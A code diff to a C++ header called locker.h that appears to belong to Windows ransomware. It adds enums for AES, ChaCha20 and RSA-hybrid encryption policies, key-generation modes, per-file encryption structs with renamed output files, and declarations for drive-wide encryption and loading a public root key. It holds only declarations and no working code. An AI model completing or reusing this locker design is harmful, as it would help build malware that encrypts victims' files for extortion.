@@ -1,26 +1,34 @@
 #ifndef _LOCKER_H_
 #define _LOCKER_H_
 
+#include <windows.h>
 #include "macro.h"
 #include "pathsystem.h"
 #include "chacha20/ecrypt-sync.h"
 #include "aes/aes256.h"
 
+enum GenPolicy
+{
+	NONE,
+	GENKEY_ONCE,
+	GENKEY_EVERY_ONCE
+};
+
+enum CryptoPolicy
+{
+	AES256 = 101,
+	CHACHA = 102,
+	RSA_AES256 = 103,
+	RSA_CHACHA = 104,
+	RSA = 150
+};
+
+typedef void (*EncryptMethodFunc)(void* FileInfo, void* ctx, int64_t* padding, BYTE* buff1, BYTE* buff2, u32 bytes);
+typedef void (*EncryptGenKeyFunc)(void* ctx, BYTE* KEY, BYTE* IV);
+
+
 namespace locker
 {
-	typedef struct file_info
-	{
-		laced_ctx CryptCtx;
-		crypto_aes_ctx CryptCtxAES;
-		LPCWSTR Filename;
-		WCHAR* newFilename;
-		LPCWSTR FilePath;
-		HANDLE FileHandle;
-		HANDLE newFileHandle;
-		LONGLONG Filesize;		
-		DWORD bit;
-	}FILE_INFO, * PFILE_INFO;
-	
 	typedef struct HashList
 	{		
 		BYTE* hash;
@@ -28,9 +36,43 @@ namespace locker
 		SLIST_ENTRY(HashList);
 	} *PHLIST, HLIST;
 
+	typedef struct CryptCTXInfo
+	{
+		CONST CHAR* name;
+		VOID* ctx;
+		int64_t	padding;
+		u32 mode;
+		CryptoPolicy method_policy;
+		GenPolicy gen_policy;		
+		EncryptMethodFunc crypt_method;
+		EncryptGenKeyFunc gen_key_method;
+	} CRYPT_INFO, * PCRYPT_INFO;
+
+	typedef struct file_info
+	{
+		PCRYPT_INFO CryptInfo;
+		LPCWSTR Filename;
+		WCHAR* newFilename;
+		LPCWSTR FilePath;
+		HANDLE FileHandle;
+		HANDLE newFileHandle;
+		LONGLONG Filesize;		
+	}FILE_INFO, * PFILE_INFO;
+	
+	typedef struct CryptoSystem
+	{
+		crypto_aes_ctx	aes_ctx;
+		laced_ctx		chacha_ctx;
+		CryptCTXInfo	alg[5];
+		u32				num;
+	}CRYPTO_SYSTEM;
 
 	
-	BOOL HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs, SLIST<HLIST>* HashList);
+
+	CRYPT_INFO* GeneratePolicy(CRYPTO_SYSTEM* sys);
+	VOID CryptoSystemInit(CRYPTO_SYSTEM* sys);
+
+	BOOL HandlerCrypt(CRYPT_INFO* CryptInfo, PDRIVE_INFO data, SLIST<HLIST>* HashList);
 	BOOL HandlerASymmetricGenKey();
 
 	VOID LoadPublicRootKey(BYTE** g_PublicKeyRoot, DWORD* size);
@@ -41,6 +83,11 @@ namespace locker
 typedef locker::HLIST HASH_LIST;
 typedef locker::HLIST* PHASH_LIST;
 typedef locker::FILE_INFO FILE_INFO;
+typedef locker::PFILE_INFO PFILE_INFO;
+typedef locker::CryptCTXInfo CRYPT_INFO;
+typedef locker::FILE_INFO FILE_INFO;
+typedef locker::CryptoSystem CRYPTO_SYSTEM;
+
 
 
 #endif
